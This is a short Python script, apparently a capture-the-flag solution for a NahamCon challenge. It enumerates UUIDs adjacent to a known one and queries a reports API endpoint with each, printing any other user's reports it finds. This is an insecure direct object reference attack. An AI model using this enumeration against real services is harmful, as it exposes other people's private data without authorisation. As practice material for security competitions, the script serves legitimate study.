from uuid import UUID
import requests

base = UUID("fd55a401-b110-4821-9155-add4653cb992")

for i in range(-20, 20):
    try:
        test_id = UUID(int=base.int + i)
        url = f"http://challenge.nahamcon.com:32718/api/v2/reports?user_id={test_id}"
        r = requests.get(url)
        if "reports" in r.text:
            print(f"[+] FOUND: {test_id}\n{r.text}")
    except:
        continue
